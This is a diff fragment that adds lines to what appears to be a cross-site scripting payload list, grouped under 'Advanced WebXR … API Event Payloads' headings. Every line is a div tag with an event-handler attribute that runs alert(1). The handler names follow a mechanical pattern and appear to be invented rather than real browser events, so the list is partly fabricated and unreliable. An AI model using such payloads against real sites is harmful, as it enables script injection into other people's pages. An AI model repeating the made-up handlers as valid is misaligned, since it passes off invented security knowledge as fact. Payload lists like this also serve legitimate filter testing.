+<div onxrfacestart="alert(1)">
+<div onxrfaceend="alert(1)">
+<div onxrfaceerror="alert(1)">
+<div onxrfacecancel="alert(1)">
+
+# Advanced WebXR Body Tracking API Event Payloads
+<div onxrbody="alert(1)">
+<div onxrbodystart="alert(1)">
+<div onxrbodyend="alert(1)">
+<div onxrbodyerror="alert(1)">
+<div onxrbodycancel="alert(1)">
+
+# Advanced WebXR Scene Understanding API Event Payloads
+<div onxrscene="alert(1)">
+<div onxrscenestart="alert(1)">
+<div onxrsceneend="alert(1)">
+<div onxrsceneerror="alert(1)">
+<div onxrscenecancel="alert(1)">
+
+# Advanced WebXR Spatial Tracking API Event Payloads
+<div onxrspatial="alert(1)">
+<div onxrspatialstart="alert(1)">
+<div onxrspatialend="alert(1)">
+<div onxrspatialerror="alert(1)">
+<div onxrspatialcancel="alert(1)">
+
+# Advanced WebXR Anchors API Event Payloads
+<div onxranchor="alert(1)">
+<div onxranchorstart="alert(1)">
+<div onxranchorend="alert(1)">
+<div onxranchorerror="alert(1)">
+<div onxranchorcancel="alert(1)">
+
+# Advanced WebXR Planes API Event Payloads
+<div onxrplane="alert(1)">
+<div onxrplanestart="alert(1)">
+<div onxrplaneend="alert(1)">
+<div onxrplaneerror="alert(1)">
+<div onxrplanecancel="alert(1)">
+
+# Advanced WebXR Meshes API Event Payloads
+<div onxrmesh="alert(1)">
+<div onxrmeshstart="alert(1)">
+<div onxrmeshend="alert(1)">
+<div onxrmesherror="alert(1)">
+<div onxrmeshcancel="alert(1)">
+
+# Advanced WebXR Hand Input API Event Payloads
+<div onxrhand="alert(1)">
+<div onxrhandstart="alert(1)">
+<div onxrhandend="alert(1)">
+<div onxrhanderror="alert(1)">
